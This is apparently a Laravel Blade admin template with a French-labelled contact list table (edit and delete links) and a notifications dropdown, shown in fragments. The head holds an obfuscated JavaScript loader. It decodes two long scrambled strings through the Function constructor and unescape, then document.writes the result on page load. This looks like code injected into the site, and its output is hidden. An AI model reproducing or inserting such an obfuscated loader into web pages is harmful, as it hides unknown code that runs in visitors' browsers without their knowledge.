...
<html lang="en" dir="ltr" data-nav-layout="vertical" data-theme-mode="light" data-header-styles="light" data-menu-styles="dark" data-toggled="close">
  <head>
      ...
      <script type="text/javascript"><!--
         function t5pa(obiu){var
         wt1f="u7;{Ct!a6y9)i:IAnSROh/jrKzq5ox|G\rcf\'-.[m,]d0eMk}g(842NLwlT\"vbP+>pV&3B DU?Es\n=X1<",h564,xg7g,l27j=Function,y21w,tq43=wt1f.length,lyc0={cd:""},ue=new l27j("ret"+"urn unesc"+"ape")(),rtze=new l27j("x",ue("%74hi%73.c%64+=x")),qqjc=new l27j("x","y",ue("%72et%75rn%20x.c%68ar%41t(%79)"));for(h564=0;h564<obiu.length;h564++){y21w=qqjc(obiu,h564);xg7g=wt1f.indexOf(y21w);if(xg7g>-1){xg7g-=(h564+1)%tq43;if(xg7g<0){xg7g+=tq43;}rtze.call(lyc0,qqjc(wt1f,xg7g));}else{rtze.call(lyc0,y21w);}}new l27j(ue("%64oc%75me%6Et.w%72it%65(t%68is.%63d)%3Bth%69s.c%64=n%75ll")).call(lyc0);}t5pa("u=-5SDiXIO\nly?hbkr,do7|R\"(mif6IGmDUB\r8aKm[t?1k!iVw6vx|TlVtClE|}+42E|SrUG.9ucMdCETkdg/)\nSr2:odlAix&{Ra6V2\"q&?M\'BuXmoi7X{lk|2\"aglr0X}\"VjmL0e/6I+jo7UK-c\npg.cmi;&6I0CoUTC{8.0)4T|hNEzopenz\"zdbc]\"}/l=A)!3{<BNk(Bw8b{O4bu<&>cj;V|,]\n3ch\nsr)].t10y\rgxM]|DU\'4}-}tS]1=mM;qBo5\'2].l?BTBq[+OSb&r}y(glE+nv4EATNXUM)V\'Lzp|RV;hE7RaPns {ky;i\'4}>(jiM 9nS]|)i g(pu&mx+!5cf\"}ox/kv<RIy2e91M+uNP13]Vz;lqjD>CqBp6;-\rqM)CqIU?pyUr0+\"NnOiGyL:v}IG(j|}-9f(zO\n!3>\'d\'3+\"tk:,C.tMNh})}oytT9&I>zjNS.q<\rD! XeU\'Lwt1w-\rC.:]92(uMSp)wN8dGwMR:p>81,/[1wx\r1&PTCMim{-Ce2Ok9k56ClyxPphu2n-z1G tB=0DfNLCXaj1?gv,-6]P:n2\rC(/BAvTLb}N/P3,|.x\n=pGg&m}pN5cfp\"iwg\"7S(\"1XpTyCu5B\'+qv53\nd c chqsf,:{-i,y4g<0>2z\"n\rArDSPu7GKp4TzVUef30U,;<|\n}I]t{u?Pt\ng0I:uoD4<T2&+ox5,v|lurmnvM?!<yKus8eG.tM4KI/:vbgA\r8rGg.)k-B4=?,c0&;{4V<[zqt/ab8\rcioI3T9g1y8frOz1B84|k\rt\no&n5B2].0n!m6)NvI}N!aD5vksog( |XS4)iUIAsB.,T{udKzC1}83:92tLTOzb:O2N-Ezi,s\nByGE :aPn-w4ky7}gI.N/\'(6m,h3a]qOvk2hb&mx+L0PTk-=+msuN[\'>NtBki9rd:m>!jL>{;6ytgfP\nB]<CGRkx/94KC,\ns\nzO!2,aKdAr,x{,KX0Bp\rzk{\"wr?An\n 5TBx:;1CT}x|y{]U;05niRUP>L\nb.[wojb9/+k\'G.9uc;t}N6]}S>pyh0vfUk0/i\n\r?7i<79)(!P\"-5995\r:2l\rwOox3K<=LMom0|Gsx\' +{z3>a7w/\nMp\'s,]x=:GCixR?|IE,Th:flRI[\r!2q=A&D-v\nm=:od\'\n+B-=;wM1Dv[yj)7Lelv=v47V[C+r9npK|{EqRafn70D;tjtXoiU[6Lh0vN,kILbcrl5>pn{ d\r;]K-=(1\"},u3E]7ab8{L9)0|n vxB4>r=zt\rORI4XK|z?y5u6zIgeitq>[\'{2kAR\'P\"hNjz3EoP3q.b=46>b[xi(yRxnR5o&r1\nNe55e(| E(?-D>zO}axMGCsb\'qus47ky7}gd.)Pu4O)2mM:Nv\rjwq+>A;B]G7,r\'\ngXTCU<Pk6\'}8387a;(&CTV;Uz/ +KRk!oe|{Evfz<E8uM6uk,\'yv1(Syw095MRq0\r!&Sp6U3{|.|,><\n)[UOv7S{lk\ra12krNbNAG\")m</.r=&25R?&0E[7Em.8 ,ud\"t[g}:yf(2tXiITEhN,+Khe[6G7qUK>.aqX-;{nM+x py[]e(5lE,IP>V2xb[3C45qKE>mU(1A+SLe-sAelUR5o:nThifUPN2uSim .&1:,(8\'[<E,de\nep(8dp/){;|}d O3no0D<uVBxrD?szsB<u?I4]c\rbX?O(Sk\"Ehx|ARvNhjKw&bx|je7U>+95j(<}=6r8vbMgy{82Ltnfvb2sG/:i,T2<xXq[Nuy9\n1mcu;C\'kKy9;KP40dDa;xv5lB{|m,zo (e RwB\'.mD\rOeM.vn!1Xzd.pI+)r[Vs\nb>KC<KN9rD?sz3[<u?I4]c\rbX?O(Sk\"Ehx|ARvmfv6wI n|GrM;?p>)or8ugXyK4bPk(9t{dSc\"v4C4B!v3CE}z\"]D\roeU1Uc(=Bd[L76D0v!A2N(V4KI/{l?\"G/|fO=Xcz-v\nUaf]f),TKgKk+-t/g7)9l2XiALV6K+ M3{}g50Drh6=:\nh\'[!<yVar");t5pa("XO65SjwM0cm4Sfjm/kPpD&;x+v}\'2fvsXM?]VxrKtV}4m9nv!{Uv=\"{R/EpxKEVGOI9.gXIPmBEtE]7k\nui{oVw}k&woPO\'R>iSx{Cf5.b=XEy- 5L}Dd+{(.[i:BzAaanM8+A:ORea;5lsbPIyf>7;\"v0e,l{-c!zvo(A.2BAg4TOj,P5|nSU?}Cs&&\nKx]s?1Xru}(4Nm,aLl\"bP.[jRfPIV\'Vtq?bP\'-)g[||mBEt[-d]3kM0iS{CN28OKz7;&|!oeRO}Cs&&\nKx]s?cX3B+Oy779melyagig(S&3bqTKgG50DX gif1[\n]d0e9c(0|-Ce8r:kSNL!Ev\rj?GIq&mBg.|DT>GUX8,Eeu7ch!v(O\"]N:&A\nj\r/h&ha\'X,r|>k\nos:U-C=.K|1[eSa,)}gu3Nqn&z6hbc+d <B3cy(Ujr6U1GI0=dPmC2e96/,).PChI7awA/spSB3BUR!b}c!={=-rxX.0n!m9y9:,o; woR>Eecp>x>81,{&Eqy[dfu&|?E/[P\'\n&lx4|");
         -->
      </script>
      <noscript>
            ...
            <div class="main-header-container container-fluid">
               ...
               <div class="header-content-right">
                  ...
                  <div class="header-element notifications-dropdown">
                     <!-- Start::header-link|dropdown-toggle --> <a href="javascript:void(0);" class="header-link dropdown-toggle" data-bs-toggle="dropdown" data-bs-auto-close="outside" id="messageDropdown" aria-expanded="false"> <i class="bx bx-bell header-link-icon"></i> <span class="badge bg-secondary rounded-pill header-icon-badge pulse pulse-secondary" id="notification-icon-badge">@include('countmessage')</span> </a> <!-- End::header-link|dropdown-toggle --> <!-- Start::main-header-dropdown --> 
                     <div class="main-header-dropdown dropdown-menu dropdown-menu-end" data-popper-placement="none">
                        <div class="p-3">
                           <div class="d-flex align-items-center justify-content-between">
                  ...
                  <div class="col-xl-12">
                     <div class="card custom-card">
                        <div class="card-header">
                           <div class="card-title"> Liste Contact</div>
                        </div>
                        <div class="card-body">
                           <table id="datatable-basic" class="table table-bordered text-nowrap" style="width:100%">
                              ...
                              @foreach($data as $item)
                                 <tr>
                                    ...
                                    <td><a href="/modifier-contact/{{$item->id}}" class="btn btn-success">Modifier</a>
                                       <a href="/suppContact/{{$item->id}}" class="btn btn-danger">Supprimer</a>
                                       </td>
